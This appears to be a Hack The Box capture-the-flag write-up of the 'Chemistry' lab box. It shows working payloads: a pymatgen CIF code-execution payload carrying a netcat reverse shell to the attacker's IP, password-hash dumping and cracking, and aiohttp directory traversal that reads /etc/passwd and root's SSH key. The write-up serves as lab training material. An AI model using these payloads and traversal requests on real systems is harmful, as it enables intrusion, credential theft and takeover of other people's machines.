---
layout: post
title: "HTB: Chemistry"
box: chemistry
img: /img/chemistry/chemistry
author: Andrew Cherney
date: 2025-03-09
tags: htb easy-box season-6 linux webapp cve python sqlite ssh-tunneling directory-traversal
icon: "assets/icons/chemistry.png"
post_description: "Classic easy box with 2 CVEs and a database reading as the solution. CIF files were something I hadn't known about before this box, and after a CVE allows for an SSTI inspired payload commands can be run within a python application. The database for that CIF processing website contains the user's credentials. And finally the internal monitoring webapp is using a server vulnerable to directory traversal which allows for LFI as root compromising the root SSH key."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
rustscan 10.129.29.110
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.129.29.110:22
Open 10.129.29.110:5000
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,5000 10.129.29.110

Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-20 01:24 UTC
Initiating Ping Scan at 01:24
Scanning 10.129.29.110 [2 ports]
Completed Ping Scan at 01:24, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:24
Completed Parallel DNS resolution of 1 host. at 01:24, 0.00s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:24
Scanning 10.129.29.110 [2 ports]
Discovered open port 22/tcp on 10.129.29.110
Discovered open port 5000/tcp on 10.129.29.110
Completed Connect Scan at 01:24, 0.08s elapsed (2 total ports)
Nmap scan report for 10.129.29.110
Host is up, received conn-refused (0.091s latency).
Scanned at 2024-10-20 01:24:48 UTC for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
5000/tcp open  upnp    syn-ack
```

```bash
nmap -sCV -p22,5000 10.129.29.110

Starting Nmap 7.92 ( https://nmap.org ) at 2024-10-19 20:25 CDT
Nmap scan report for 10.129.29.110
Host is up (0.078s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sun, 20 Oct 2024 01:25:33 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.92%I=7%D=10/19%Time=67145BFF%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\x2
--[snip]--
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80

Uploading and analyzing a CIF file? This reminds me of a shiny app a friend of mine showed me to analyze and make pie charts out of data sets. I don't think R had any vulnerabilities within it but perhaps whatever runs this might.

![CIF analyzer front page]({{ page.img }}_1_5000_front_page.png)

![register account]({{ page.img }}_2_5000_register.png)

![CIF dashboard]({{ page.img }}_3_5000_dashboard.png)

Uploads and processes a CIF file as expected. There is sample data so I'll upload that and see how it's meant to function.

```bash
example.cif

data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

![test cif]({{ page.img }}_4_test_cif_dashboard.png)

![uploaded test cif]({{ page.img }}_5_test_cif_view.png)

Analyzes the crystal structure based off the file uploaded.

# User as rosa

## shell as app

### CVE-2024-23346

I tested the file uploads and it seems to strictly require a CIF file. Next onto google to search for any vulnerabilities around processing these files. I did find a CVE within the pymatgen library which processes CIF files. Worth a look.

[https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) is the official github advisory labelling a way to subclass traverse to the BuiltinImporter and load the os module for arbitrary code execution. The payload that executes the code is similar to SSTI within python where you find all objects then grab the one you need to import or use a local module for arbitrary code execution. Below is the payload from that advisory.

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

I uploaded this and got a 500 internal server error. Seems I need to still adhere to some expected structure. To do this I'll modify the test data to replace the _space_group and add the references to the _space_group to the bottom. I tried some other shells but going down the list busybox was the first one to work for me. You might have different results as many of my tests were 500 internal server errors. 

```bash
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.94 7777 -e bash");0,0,0'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.129.29.110 38378
bash: cannot set terminal process group (1044): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
```

There was an odd quirk where when trying to download and run a bash shell that the letter c would be prepended with *, seen here `10.129.29.110 - - [19/Oct/2024 21:48:53] "GET /ra*c*coonshell.sh HTTP/1.1" 404 -`.


## database.db

Seeing this was probably a flask app from earlier enumeration the **app.py** file will contain all routes and potential secrets.

```bash
app@chemistry:~$ cat app.py
cat app.py
from flask import Flask, render_template, request, redirect, url_for, flash
from werkzeug.utils import secure_filename
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from pymatgen.io.cif import CifParser
import hashlib
import os
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}
```

sqlite database in use here. Need a better session so I run:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

```bash
app@chemistry:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1044/python3.9      
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
```

Something also running locally at 8080. We'll investigate later. Onto the database.

```bash
app@chemistry:~$ find / -name "database.db" 2>/dev/null
/home/app/instance/database.db
app@chemistry:~$ cd instance
app@chemistry:~/instance$ sqlite database.db 

Command 'sqlite' not found, but can be installed with:

apt install sqlite
Please ask your administrator.

app@chemistry:~/instance$ sqlite3 database.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
structure  user
sqlite> select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|raccoon|3f5b31f8506cfb9a606553978da02d9f
```

Use crackstation and find the following pairs:

```
rosa:unicorniosrosados
carlos:carlos123
peter:peterparker
victoria:victoria
raccoon:raccoon (me)
```

```bash
app@chemistry:~/instance$ su rosa
Password: 
rosa@chemistry:/home/app/instance$ cd ~
rosa@chemistry:~$ cat user.txt
a9a5ae09ed----------------------
```

# Root

Remembering back to that service it would be worth determining what is there. I will need to ssh tunnel so I can access the local port.

```bash
ssh rosa@10.129.29.110 -L 7777:127.0.0.1:8080
rosa@10.129.29.110's password: 
rosa@chemistry:~$ 
```

## internal monitor

{% include img_link src="/img/chemistry/chemistry_6_8080_monitoring" alt="port_8080_monitoring" ext="png" trunc=600 %}

```bash
dirsearch -u http://localhost:7777

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/6_Season/Chemistry/reports/http_localhost_7777/_24-10-19_22-55-54.txt

Target: http://localhost:7777/

[22:55:54] Starting: 
[22:56:21] 403 -   14B  - /assets/
[22:56:21] 403 -   14B  - /assets

Task Completed

whatweb http://localhost:7777
http://localhost:7777 [200 OK] HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[::1], JQuery[3.6.0], Script, Title[Site Monitoring]
```

### CVE-2024-23334

*aiohttp/3.9.1*from what I can tell online appears to be vulnerable to a CVE centered around directory traversal. [https://github.com/jhonnybonny/CVE-2024-23334](https://github.com/jhonnybonny/CVE-2024-23334). The exploit will continually check for more *../* until a positive result of **/etc/passwd** is read. This process can be done in burp since I have it open, and we will need some directory to use. Luckily I already found **/assets** so this will be our directory traversal target.

```bash
GET /assets/§§etc/passwd HTTP/1.1
Host: localhost:7777
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: default-theme=ngax; css_dark_mode=false
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```


```
payloads

../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
```

And once you find the right amount of traversal the **/etc/passwd** can be read.

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Etag: "17fd638c3d6090a6-7c0"
Last-Modified: Fri, 11 Oct 2024 11:48:06 GMT
Content-Length: 1984
Accept-Ranges: bytes
Date: Sun, 20 Oct 2024 04:05:49 GMT
Server: Python/3.9 aiohttp/3.9.1

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
--[snip]--
```

Modify the request to `GET /assets/../../../../../root/.ssh/id_rsa` and read the SSH key to pwn the machine. 

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Etag: "17d9a4c79c30680c-a2a"
Last-Modified: Mon, 17 Jun 2024 00:58:31 GMT
Content-Length: 2602
Accept-Ranges: bytes
Date: Sun, 20 Oct 2024 04:08:59 GMT
Server: Python/3.9 aiohttp/3.9.1

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsFbYzGxskgZ6YM1LOUJsjU66WHi8Y2ZFQcM3G8VjO+NHKK8P0hIU
--[snip]--
```

```bash
ssh root@10.129.29.110 -i root_rsa 

root@chemistry:~# cat root.txt
7dc91130------------------------
```


